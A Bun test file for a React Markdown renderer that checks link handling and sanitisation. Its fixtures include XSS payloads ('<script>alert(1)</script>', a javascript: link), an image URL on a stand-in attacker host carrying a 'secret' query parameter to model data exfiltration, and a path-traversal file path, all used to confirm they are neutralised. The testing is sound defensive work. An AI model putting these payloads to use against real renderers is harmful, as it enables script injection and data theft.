import { expect, test } from "bun:test";
import { renderToStaticMarkup } from "react-dom/server";
import { Markdown, type MarkdownLinkProps } from "./markdown.tsx";

const spanLink = ({ children, href }: MarkdownLinkProps) => (
  <span data-x={href}>{children}</span>
);

test("renderLink replaces the default anchor", () => {
  const html = renderToStaticMarkup(
    <Markdown renderLink={spanLink}>{"[a](/wiki/foo)"}</Markdown>
  );
  expect(html).toContain('<span data-x="/wiki/foo">a</span>');
  expect(html).not.toContain("<a ");
});

test("bold text renders as strong", () => {
  expect(renderToStaticMarkup(<Markdown>{"**a**"}</Markdown>)).toContain(
    "<strong>a</strong>"
  );
});

test("raw script tags are dropped", () => {
  const html = renderToStaticMarkup(
    <Markdown>{"<script>alert(1)</script>"}</Markdown>
  );
  expect(html).not.toContain("<script");
});

test("links open in a new tab without opener access", () => {
  const html = renderToStaticMarkup(
    <Markdown>{"[x](https://e.com)"}</Markdown>
  );
  expect(html).toContain('target="_blank"');
  expect(html).toContain('rel="noopener noreferrer"');
  expect(html).toContain('href="https://e.com"');
});

test("javascript: links lose their href", () => {
  const html = renderToStaticMarkup(
    <Markdown>{"[x](javascript:alert(1))"}</Markdown>
  );
  expect(html).not.toContain("javascript:");
});

test("a dash list renders list items", () => {
  const html = renderToStaticMarkup(<Markdown>{"- a\n- b"}</Markdown>);
  expect(html).toContain("<li>a</li>");
  expect(html).toContain("<li>b</li>");
});

test("images from absolute URLs render as links, not images", () => {
  const html = renderToStaticMarkup(
    <Markdown>{"![x](https://evil.example/a.png?d=secret)"}</Markdown>
  );
  expect(html).not.toContain("<img");
  expect(html).toContain(
    '<a class="underline underline-offset-2" href="https://evil.example/a.png?d=secret"'
  );
  expect(html).toContain(">https://evil.example/a.png?d=secret</a>");
});

test("Harbourmaster file images render as images", () => {
  const html = renderToStaticMarkup(
    <Markdown>{"![x](/files/abc123)"}</Markdown>
  );
  expect(html).toContain("<img");
  expect(html).toContain('src="/files/abc123"');
});

test("library download images render as images", () => {
  const html = renderToStaticMarkup(
    <Markdown>{"![x](/api/library/download?path=a.png)"}</Markdown>
  );
  expect(html).toContain("<img");
});

test("protocol-relative image URLs render as links", () => {
  const html = renderToStaticMarkup(
    <Markdown>{"![x](//evil.example/a.png)"}</Markdown>
  );
  expect(html).not.toContain("<img");
});

test("file image paths with extra segments render as links", () => {
  const html = renderToStaticMarkup(
    <Markdown>{"![x](/files/abc/../../x)"}</Markdown>
  );
  expect(html).not.toContain("<img");
});
